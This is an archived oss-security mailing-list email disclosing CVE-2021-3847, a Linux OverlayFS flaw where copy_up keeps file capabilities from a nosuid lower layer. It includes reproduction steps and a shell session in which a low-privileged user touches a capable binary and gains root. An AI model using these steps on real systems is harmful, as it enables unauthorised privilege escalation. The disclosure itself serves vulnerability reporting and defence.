X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5117" "Thursday" "14" "October" "2021" "18:30:53" "+0000" "Alon Zahavi" "Alon.Zahavi@cyberark.com" nil "140" "[oss-security] CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up" nil nil nil "10" nil nil (number mark "U       Alon.Zahavi@ Oct 14  140/5117  " thread-indent "\"[oss-security] CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 22290 invoked by uid 550); 14 Oct 2021 18:53:47 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 13687 invoked from network); 14 Oct 2021 18:31:14 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=cyberark.com; h=from : to : subject
 : date : message-id : references : in-reply-to : content-type :
 mime-version; s=0121pod; bh=z0Km7F98vXyZSMqI8rwcYSrI20AEq0P7Gmcr33UQvUg=;
 b=W6CRY+nRGIcpZgyGXNxDW3qIewb2AkWIP0ly5vv/nuoX6Y6juWJTTWgaoyxo789wd5YV
 jW0HO/zgoMHBNoo1B1fxidmafWHDlHQH1/Vh8LiPxg2Bs/WZ0CsirlrLvcUrZoepGua4
 HaBDzicQj8ryBLXq6f9naBlkkXusYKN7+igFohTez/YSNaDDM231ROKliowewn3uIo0V
 v/Otr9tiNcYzJ3lanbRkYFCr4+BIhHENW2AZTlDEEU1iFXBjzXx7xaN583b6cXBu2aZQ
 M14uRpF9ZqQznhnDKekzW+PhIh93jCcnoN7io3wknFTie0V+yhB+yJjwuk4pi70jipVT Pg== 
X-MS-Exchange-Authentication-Results: spf=temperror (sender IP is
 144.49.245.140) smtp.mailfrom=cyberark.com; lists.openwall.com; dkim=none
 (message not signed) header.d=none;lists.openwall.com; dmarc=temperror
 action=none header.from=cyberark.com;
Received-SPF: TempError (protection.outlook.com: error in processing during
 lookup of cyberark.com: DNS Timeout)
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=Em/jPDcE2gNcsm5RDPwQATL/vT/hJoel0odCAbgUx/pHhowM8ilGiy6n8YhxQ8iBv0/iPeN4CCbz+zks+eFw2aLDOHQR8PqQMbPqLA/tRSnjAZB9bviHn+bkMRd5Pe4sr06vHC8rpcPBLESkvjkHmHtFhBkct8LsdzXHCX/M1h46PxSzxY+lpIBdG3J8UU9Zi6amMp3qR7ZkwITz6UFsvByCjFRRtlGrQ2J+Q6Z1x9F/mP0owaEwbg+jTPEagkuB4cKRB0y2vAjTzIhiP4DUmW3l+MeYhzOEDQ0Hh3Nc2vwCh3NuIvlfkG6FvD5MZGC3wEUb8d9yjquRTBHgZgX3lA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=z0Km7F98vXyZSMqI8rwcYSrI20AEq0P7Gmcr33UQvUg=;
 b=gvDDmcfqgknSwm/gGXCBZdC2p+fsfZb3Y1My+HxxoztLr126MqUPViErtKDL6h5znut3HhCGaq4COP8q8gOicP8Phe+3O8W2YpdkJ0Nxg4UW4LtuVHJKRbUHWjOQRAKrMB3/j/sIVqgD3klcEwbHQt20DnEJKmbs71goAsx/j8X8ZMxLj0lNL0yyaAhScdupq6fwc9ja1VqZ6TIE9Hq5+TT8lLaYTNlDaSOb5t8IIFOdpSaKefedZ8rjs477XknGkLvWk2GuM48wMasu9jFBJoaARHeQFBgAHm0JJdHJFnnIUVbvE3b5Ky4PrtCf67UfYdh8IUD2RI4PDEA+Z5Ubrw==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=cyberark.com; dmarc=pass action=none header.from=cyberark.com;
 dkim=pass header.d=cyberark.com; arc=none
From: Alon Zahavi <Alon.Zahavi@cyberark.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: CVE-2021-3847: OverlayFS - Potential Privilege Escalation using
 overlays copy_up
Thread-Index: AQHXwSmfPL+PFLSaJ0SM+8IwSo8/qg==
Date: Thu, 14 Oct 2021 18:30:53 +0000
Message-ID: 
 <PAXP193MB1405A3EC41713BE9D524FBE48DB89@PAXP193MB1405.EURP193.PROD.OUTLOOK.COM>
References: 
 <DB9P193MB140461EEF44F153D9F66FF958DB89@DB9P193MB1404.EURP193.PROD.OUTLOOK.COM>
In-Reply-To: 
 <DB9P193MB140461EEF44F153D9F66FF958DB89@DB9P193MB1404.EURP193.PROD.OUTLOOK.COM>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
Authentication-Results-Original: lists.openwall.com; dkim=none (message not
 signed) header.d=none;lists.openwall.com; dmarc=none action=none
 header.from=cyberark.com;
x-ms-publictraffictype: Email
X-MS-Office365-Filtering-Correlation-Id: 5814dd29-fd35-4a55-8281-08d98f40c23d
x-ms-traffictypediagnostic: PAXP193MB1182:|PAXP193MB1903:
X-Microsoft-Antispam-PRVS: 
	<PAXP193MB19037BC8E47EA04749F2EF6A8DB89@PAXP193MB1903.EURP193.PROD.OUTLOOK.COM>
x-ms-oob-tlc-oobclassifiers: OLM:10000;OLM:10000;
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam-Untrusted: BCL:0;
X-Microsoft-Antispam-Message-Info-Original: 
 Lh1xRSvr+4c4uKE2Lbby1M0f58ZHNutvAnoabvtzSYKuY04WSK1SRAfT4dbWiaPonKvqhkuKsTgW2KwhkYVEC725iM1RYSR0k0bugy3jxxuwIGrO3aHo3/r3o0hpKWOHGC3rtV65X4foLxXZgk9doFVlcZYGtNaz1AY1CW12T4+l/yE2kzutyEHHnmxcjYKXFiri6UWr6iIQVC2wtIx5DvgxSvjHDPKbW4CWwudJQdrLQJLCEwYy+1UdrmMD3hBo+FonbiFxCX4WeIMNpjlcJzPJhL2qw3COIKyBJiZRx04P8Rb6hj1MjrqMSD/97zpCQS/YWQAtbPzIUpfWgqjctriCEKAF/8iufhxGEC5MhQTr+2xh6HyfM59jyzQvo0yWc0w9gyAOw4TK2jgG9MrBjnqjhT1PuPXvmw+6CMECRGaU0m8Znzh5sLjebymxmhrBqdJRToRWUNmntH1hD9hXKRUevq1hOqYbj8/dDJNbkf6Nhgoe89l+vweLSwPuH/YnO+XYhFLZhmiEmymL/O6HTOBHL4RymOllhRatfw/CWtO3w17YWkQ51hiLzJmCfvi83zIw5Trsi/dFGPapdggOJbOczHXqcIrSbFhBl9Cu2iiLM2QCioZMsViIDEg1xR0CjUb+iNHlrNByyAfA99TTaudTmKt7Vb53/cmg1FPzdgNIvl0R6PMeUcCbUg49hj6fqq1XHpM/+j3dVTKodWsACjFoK7Bhvd9PmG/ofcbuMOwMSkYtf7ckjiirH/nrCzLi
X-Forefront-Antispam-Report-Untrusted: 
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:PAXP193MB1405.EURP193.PROD.OUTLOOK.COM;PTR:;CAT:NONE;SFS:(4636009)(366004)(122000001)(66946007)(8936002)(9686003)(38100700002)(83380400001)(316002)(91956017)(2906002)(508600001)(66556008)(76116006)(186003)(66476007)(55016002)(38070700005)(6916009)(33656002)(5660300002)(52536014)(7696005)(66446008)(86362001)(71200400001)(64756008)(6506007)(8676002)(123130200002);DIR:OUT;SFP:1102;
x-ms-exchange-transport-forked: True
Content-Type: multipart/alternative;
	boundary="_000_PAXP193MB1405A3EC41713BE9D524FBE48DB89PAXP193MB1405EURP_"
MIME-Version: 1.0
X-MS-Exchange-Transport-CrossTenantHeadersStamped: PAXP193MB1182
X-CFilter-Loop: Reflected
X-DetectorID-Processed: 68daeca9-e0cd-4a7b-997c-668562852d58
X-EOPAttributedMessage: 0
X-MS-Exchange-Transport-CrossTenantHeadersStripped: 
 AM5EUR03FT014.eop-EUR03.prod.protection.outlook.com
X-MS-Office365-Filtering-Correlation-Id-Prvs: 
	16fdf97f-c157-4dc8-14d6-08d98f40c1a3
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: 
	teIroGeuSmy2S6WUKaQLZfKp41j9mRlM/NK80O+KtLF5E8afZHEverMw8k01BoiHdr5qsivt0/awRUshkb+LfCHWlKNnnYT5zr1SlDJfEvBi0D1/+uAonadcmxHcMTPDQGdL3WTmYJAE/VlqpSWedJE3hlRe8kQG/fqJ0yFVHMbC+BWADxC3I9e8lX78JaPt+Pbfo9GWV+yquEUcSdyeA8jCSzDiXDBgHbQNMksUmgG5EctSPMMHNTi3R41xRq0+pX9iihfyqdAi7JfboUAD6vfmCcgWXgNRtmxs2pzenA8t+BLM5RvtR3l0tiN3eeY182gPxxOD/W7yaBBdj3Qh3ILsTibHPBiXOF66AB+AuaP4Jb1U0R9xHgN0VrVb1KMedxjY1tbxnMm/FySlptGk4J5c4un/R5Cd33TpUlye8zLYaeImeijUhy/ldfbXiSwG/zZsCNnV43RByzW5bNeMyC5Uwg5MfCNn2Jn7W8IF4XxLWLuesPmEvG6QPic8RN90d7eWw/+qPTQTVFDQ5Wb+lyUOvhJsK4LWG23gkF/bHUjblqZM4q9pm61LNadoEbxjYq1NOAF56LMwLRG6OAbI64C1bpuE0p/fsie5iOcVeQ0R4ZoGZsCc7pUrJdBnUQcpRYrnErmslmX/sdb+tzb+H6u7RBXrAcgu1xlWF2YoKEIjOmwti0qmNUP6LKd4goeNUItwOGI8B7OEsKCgAbKJHhslhBvp9tZBu8DspQkpB1gI+wouC79KDP0tmvuZaw8ZPGa4QRlUIUM1LqWI5fUYAw==
X-Forefront-Antispam-Report: 
	CIP:144.49.245.140;CTRY:US;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:mail.ds.dlp.protect.symantec.com;PTR:InfoDomainNonexistent;CAT:NONE;SFS:(4636009)(36840700001)(46966006)(47076005)(26005)(83380400001)(356005)(82310400003)(6506007)(81166007)(186003)(70206006)(8936002)(336012)(63350400001)(70586007)(55016002)(52536014)(5660300002)(8676002)(63370400001)(316002)(7696005)(508600001)(86362001)(33656002)(2906002)(36860700001)(9686003)(6916009)(36900700001)(123130200002);DIR:OUT;SFP:1102;
X-OriginatorOrg: cyberark.com
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 14 Oct 2021 18:30:54.8226
 (UTC)
X-MS-Exchange-CrossTenant-Network-Message-Id: 5814dd29-fd35-4a55-8281-08d98f40c23d
X-MS-Exchange-CrossTenant-Id: dc5c35ed-5102-4908-9a31-244d3e0134c6
X-MS-Exchange-CrossTenant-OriginalAttributedTenantConnectingIp: TenantId=dc5c35ed-5102-4908-9a31-244d3e0134c6;Ip=[144.49.245.140];Helo=[mail.ds.dlp.protect.symantec.com]
X-MS-Exchange-CrossTenant-AuthSource: 
	AM5EUR03FT014.eop-EUR03.prod.protection.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Anonymous
X-MS-Exchange-CrossTenant-FromEntityHeader: HybridOnPrem
X-MS-Exchange-Transport-CrossTenantHeadersStamped: PAXP193MB1903
X-Proofpoint-GUID: OrWd4qm9aYmjw7z0ehB0EAo-AI0n7oaW
X-Proofpoint-ORIG-GUID: OrWd4qm9aYmjw7z0ehB0EAo-AI0n7oaW
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.182.1,Aquarius:18.0.790,Hydra:6.0.425,FMLib:17.0.607.475
 definitions=2021-10-14_10,2021-10-14_02,2020-04-07_01
X-Proofpoint-Spam-Details: rule=spam_outbound_notspam policy=spam_outbound score=0 mlxscore=0
 priorityscore=1501 malwarescore=0 adultscore=0 lowpriorityscore=0
 mlxlogscore=999 clxscore=1034 spamscore=0 phishscore=0 suspectscore=0
 bulkscore=0 impostorscore=0 classifier=spam adjust=0 reason=mlx
 scancount=1 engine=8.12.0-2109230001 definitions=main-2110140104
Subject: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege Escalation using
 overlays copy_up

--_000_PAXP193MB1405A3EC41713BE9D524FBE48DB89PAXP193MB1405EURP_
Content-Type: text/plain; charset="Windows-1252"
Content-Transfer-Encoding: quoted-printable


After disclosing the issue with the linux-distros mailing list, I am report=
ing the security issue publicly to here.
There is no patch available and may not be available for a long time becaus=
e the kernel can=92t enforce the mitigation proposed, as that would be a la=
yering violation and could also possibly cause a regression.
This vulnerability was attached with CVE-2021-3847.
Here is the report that was initially sent:

## Bug Class
Escalation of privileges - Bypassing the security extended attribute attach=
ment restrictions (in order to modify the security.capability xattr, a proc=
ess will need CAP_SYS_ADMIN or CAP_SETFCAP).
# Technical Details
## Summary:
An attacker with a low-privileged user on a Linux machine with an overlay m=
ount which has a file capability in one of its layers may escalate his priv=
ileges up to root when copying a capable file from a nosuid mount into anot=
her mount.
## In details:
If there is an overlay mount that one of its lower layers contains a file w=
ith capabilities and in case that the lower layer is a nosuid mount (which =
means the file capabilities are being ignored at execution), an attacker wi=
th low-privileges user can touch the file, which causes the overlayFS drive=
r to copy_up the file with its capabilities into the upper layer. That way =
the attacker can now execute the file with the file's capabilities, thus es=
calating its privileges.
See attached image.
## Build:
Any Linux machine with a support for overlayFS.
For example: AWS EC2 Ubuntu 20.04.
Mount a device to any folder.
Copy any file with capabilities into that folder.
Remount the device now with nosuid option.
mount an overlayFS mount where there are two layers. Make sure the lower di=
rectory is the directory with the capable file.
## Execution:
As a low-priv user cd into the merged directory.
Execute touch capable_file
cd to the upper layer directory.
Execute the capable binary.
## Expected Results:
When copying a capable file using a low privileges user, the file should be=
 copied without any file capabilities. As the Linux kernel restricts the co=
pying of a file with capabilities, so low-pric user should not be able to a=
chieve this goal.
## Observed Results:
The new file that appears in the upper layer directory have the same capabi=
lities as the file that had been copied. This behavior occur probably becau=
se the overlay driver's process is the one responsible for the copying, and=
 it copies the whole file with its extended attributes.


########## Example ##########
# there are two mount in question
$ cd /home/user/overlayfs/

$ ls -l
drwxr-xr-x 3 user user   4096 Sep 19 14:07 lowerUSB
drwxrwxr-x 1 user user   4096 Sep 19 14:06 merge
drwxrwxr-x 2 user user   4096 Sep 14 13:32 test
drwxrwxr-x 2 user user   4096 Sep 19 14:06 upper
drwxrwxr-x 3 user user   4096 Sep 19 14:25 work

# there are two mount in question.
# lowerUSB is a mount of an USB, which has a capable file inside.
# IMPORTENT NOTE: This mount has "nosuid" option, so capabilities should be=
 ignored while executing it.
# The second mount is the overlay mount. Its lower directory is `lowerUSB/`=
 which is the first mount mentioned above. Its upper is just a regular dire=
ctory on the root fs.
$ mount
/dev/sdd on /home/user/overlayfs/lowerUSB type ext4 (rw,nosuid,nodev,relati=
me,uhelper=3Dudisks2)
overlay on /home/user/overlayfs/merge type overlay (rw,relatime,lowerdir=3D=
lowerUSB,upperdir=3Dupper,workdir=3Dwork)

# The contents of all the directories.
$ ls -l *
lowerUSB:
total 40
-rwxr-xr-x 1 user user 17104 Sep 13 15:58 escalate
drwx------ 2 user user 16384 Jul  5 14:07 lost+found

merge:
total 40
-rwxr-xr-x 1 user user 17104 Sep 19 14:27 escalate
drwx------ 2 user user 16384 Jul  5 14:07 lost+found

test:
total 0

upper:
total 0

work:
total 4
d--------- 2 root root 4096 Sep 19 14:25 work

# escalate is an executable that set its uid and gid to 0.
$ getcap ./lowerUSB/escalate
./lowerUSB/escalate =3D cap_setgid,cap_setuid+eip

$ id
uid=3D1000(user) gid=3D1000(user) groups=3D1000(user)

# When trying to execute ./lowerUSB/escalate, it does not work because it i=
s a `nosuid` mount.
$ ./lowerUSB/escalate
[-] Failure

# Try to copy the binary with its capabilities.
# It should not work, because regular users are not allowed to copy the "se=
curity.capability" xattr.
$ cp --preserve=3Dall ./lowerUSB/escalate ./test/escalate
cp: setting attribute 'security.capability' for 'security.capability': Oper=
ation not permitted

# Trigger the copy_up
$ touch ./merge/escalate
$ ls -l ./upper/
-rwxr-xr-x 1 user user 17K Sep 19 15:01 escalate

# The copy_up kept the binary capabilities (xattr)
$ getcap ./upper/escalate
./upper/escalate =3D cap_setgid,cap_setuid+eip

# executing the binary, with the capabilities, so the privileges will escal=
ate to root.
$ ./upper/escalate
$ id
uid=3D0(root) gid=3D0(root) groups=3D0(root)



--_000_PAXP193MB1405A3EC41713BE9D524FBE48DB89PAXP193MB1405EURP_--
